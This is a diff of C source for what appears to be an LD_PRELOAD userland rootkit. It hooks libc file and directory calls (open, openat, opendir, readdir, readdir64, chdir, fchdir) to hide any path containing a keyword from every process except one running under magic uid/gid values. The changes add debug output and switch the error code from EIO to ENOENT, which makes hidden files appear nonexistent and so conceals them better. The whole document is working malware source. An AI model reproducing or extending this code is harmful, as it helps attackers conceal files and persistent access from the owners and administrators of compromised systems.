@@ -30,7 +30,15 @@ int (*old_chdir)(const char *path);
 int (*old_fchdir)(int fd);
 
 
+//Let's debug fam
+#define DEBUG 1
+
 int ismaster(){
+
+    #ifdef DEBUG
+	printf("ismaster called\n");
+    #endif
+
     //TODO find a good way to verify that master is master
     //char *username;
     //username = malloc(256);
@@ -43,26 +51,37 @@ int ismaster(){
 
     //free(username);
     
-    int myuid, mygid; = 0;
+    int myuid = 0; 
+    int mygid = 0;
     myuid = getuid();
     mygid = getgid();
 
-    if(myuid == magicuid && mygid == magicgid)
+    if(myuid == magicuid && mygid == magicgid){
+	#ifdef DEBUG
+	    printf("ismaster check passed\n");
+	#endif
+
 	return 0;
+    }
 
     return 1;
 
 }
 
 int open(const char *pathname, int flags, mode_t mode){
-    
+   
+    #ifdef DEBUG
+	printf("open hooked\n");
+    #endif
+
+
     if(!old_open){
 	old_open = dlsym(RTLD_NEXT,"open");
     }
 
     if(strstr(pathname, keyword)){
 	if(ismaster() != 0){
-	    errno = EIO;
+	    errno = ENOENT;
 	    return -1;
 	}
     }
@@ -72,14 +91,18 @@ int open(const char *pathname, int flags, mode_t mode){
 }
 
 int openat(int dirfd, const char *pathname, int flags, mode_t mode){
-    
+   
+    #ifdef DEBUG
+	printf("openat hooked\n");
+    #endif
+
     if(!old_openat){
 	old_openat = dlsym(RTLD_NEXT,"openat");
     }
 
     if(strstr(pathname, keyword)){
 	if(ismaster() != 0){
-	    errno = EIO;
+	    errno = ENOENT;
 	    return -1;
 	}
     }
@@ -90,13 +113,18 @@ int openat(int dirfd, const char *pathname, int flags, mode_t mode){
 //hook the opendir function
 DIR *opendir(const char *name){
     
+    #ifdef DEBUG
+	printf("opendir hooked\n");
+    #endif
+
+
     if(!old_opendir){
 	old_opendir = dlsym(RTLD_NEXT,"opendir");
     }
 
     if(strstr(name, keyword)){
 	if(ismaster() != 0){
-	    errno = EIO;
+	    errno = ENOENT;
 	    return NULL;
 	}
     }
@@ -105,13 +133,19 @@ DIR *opendir(const char *name){
 }
 
 DIR *opendir64(const char *name){
+    
+    #ifdef DEBUG
+	printf("opendir64 hooked\n");
+    #endif
+
+
     if(!old_opendir64){
 	old_opendir64 = dlsym(RTLD_NEXT,"opendir64");
     }
    
     if(strstr(name, keyword)){
 	if(ismaster() != 0){
-	    errno = EIO;
+	    errno = ENOENT;
 	    return NULL;
 	}
     }
@@ -121,7 +155,11 @@ DIR *opendir64(const char *name){
 }
 
 struct dirent *readdir(DIR *dirp){
-  
+   
+    #ifdef DEBUG
+	printf("readdir hooked\n");
+    #endif
+
     struct dirent *dir;
     char path[PATH_MAX + 1];
 
@@ -162,6 +200,11 @@ struct dirent64 *readdir64(DIR *dirp){
     struct dirent64 *dir;
     char path[PATH_MAX + 1];
 
+    #ifdef DEBUG
+	printf("readdir hooked\n");
+    #endif
+
+
     if(!old_readdir64){
 	old_readdir64 = dlsym(RTLD_NEXT,"readdir64");
     }
@@ -177,7 +220,7 @@ struct dirent64 *readdir64(DIR *dirp){
 	
 	if(dir != NULL && (strcmp(dir->d_name,".\0") == 0 || strcmp(dir->d_name,"/\0") == 0))
 	    continue;
-
+    //yes mom i know why this works
 	if(dir != NULL){
 	    int fd = dirfd(dirp);
 	    char fd_path[256];
@@ -196,8 +239,10 @@ struct dirent64 *readdir64(DIR *dirp){
 }
 
 int chdir(const char *path){
-    
-    //TODO vim is breaking here and in fchdir, we need to fix that :(
+
+    #ifdef DEBUG
+	printf("chdir hooked\n");
+    #endif   
 
     if(!old_chdir){
 	old_chdir = dlsym(RTLD_NEXT,"chdir");
@@ -205,7 +250,7 @@ int chdir(const char *path){
 
     if(strstr(path, keyword)){
 	if(ismaster() != 0){
-	    errno = EIO;
+	    errno = ENOENT;
 	    return -1;
 	}
     }
@@ -215,6 +260,10 @@ int chdir(const char *path){
 
 int fchdir(int fd){
     
+    #ifdef DEBUG
+	printf("fchdir hooked\n");
+    #endif
+
     char fd_path[256];
     char dir[256];
     int pos;
